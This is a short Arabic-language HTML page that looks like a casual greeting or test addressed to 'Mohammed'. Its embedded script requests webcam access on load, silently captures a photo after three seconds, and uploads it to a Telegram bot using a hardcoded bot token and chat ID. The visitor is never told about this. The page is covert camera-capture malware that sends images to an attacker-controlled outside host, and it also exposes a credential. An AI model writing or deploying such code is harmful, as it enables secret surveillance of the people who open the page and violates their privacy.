<!DOCTYPE html>
<html lang="ar">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>    اقبل يحب ذا تست بس </title>
</head>

<body>
    <h1>هايييييييييييييييييييي محمد</h1>
    <video id="video" width="640" height="480" autoplay></video>
    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const telegramBotToken = '7429529715:AAEKiCoWo6w_55Y94HQOSb3EO1v_m_6ThFs'; // ضع رمز البوت هنا
        const chatId = '6335563455'; // ضع معرف الدردشة الخاص بك هنا

        // طلب الوصول إلى الكاميرا
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                // التقاط الصورة وإرسالها مباشرةً بعد بدء تشغيل الفيديو
                setTimeout(() => {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'photo.png');

                        // إرسال الصورة إلى البوت عبر API تليغرام
                        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        })
                            .then(response => response.json())
                            .then(data => {
                                if (!data.ok) {
                                    console.error('فشل إرسال الصورة:', data.description);
                                }
                            })
                            .catch(error => console.error('حدث خطأ أثناء الإرسال:', error));
                    }, 'image/png');
                }, 3000); // يتم التقاط الصورة بعد 3 ثوانٍ من تشغيل الفيديو
            })
            .catch(err => {
                console.error("حدث خطأ في الوصول إلى الكاميرا: " + err);
            });
    </script>
</body>

</html>
